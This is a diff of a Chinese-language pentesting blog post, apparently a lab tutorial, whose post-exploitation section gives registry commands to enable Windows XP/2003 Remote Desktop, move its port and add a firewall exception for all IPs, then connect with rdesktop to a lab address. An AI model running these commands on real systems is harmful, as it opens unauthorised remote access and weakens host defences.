@@ -54,11 +54,20 @@ category: exploiting
 ## 0x4 开启远程桌面端口以及远程连接
 
 ```c
-    REG query HKLM\SYSTEM\CurrentControlSet\Controly\Terminal" "Server\WinStations\RDP-Tcp /v PortNumber //查询终端端口
-    REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal" "Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f //开启XP&2003终端服务
-    REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal" "Server\Wds\rdpwd\Tds\tcp /v PortNumber /t REG_DWORD /d 0x7d8 /f   //更改终端端口为2008(0x7d8)默认为3389（0xD3D）
+    REG query HKLM\SYSTEM\CurrentControlSet\Controly\Terminal" "Server\WinStations\RDP-Tcp 
+    /v PortNumber //查询终端端口
+    REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal" "Server /v fDenyTSConnections 
+    /t REG_DWORD /d 00000000 /f //开启XP&2003终端服务
+    REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal" "Server\Wds\rdpwd\Tds\tcp 
+    /v PortNumber /t REG_DWORD /d 0x7d8 /f   //更改终端端口为2008(0x7d8)默认为3389（0xD3D）
     REG ADD HKLM\SYSTEM\CurrentControlSet\Services\SharedAccess\
-    Parameters\FirewallPolicy\StandardProfile\GloballyOpenPorts\List /v 3389:TCP /t REG_SZ /d 3389:TCP:*:Enabled:@xpsp2res.dll,-22009 /f         //取消xp&2003系统防火墙对终端服务的限制及IP连接的限制
+
+    Parameters\FirewallPolicy\StandardProfile\GloballyOpenPorts\List /v 3389:TCP /t REG_SZ /d 
+    3389:TCP:*:Enabled:@xpsp2res.dll,-22009 /f
+    //取消xp&2003系统防火墙对终端服务的限制及IP连接的限制
+    
+    rdesktop -f -a 16 192.168.88.139:3389
+    //在另一个终端开启远程桌面
 ```
 
 ![](/images/20210326-8.png)
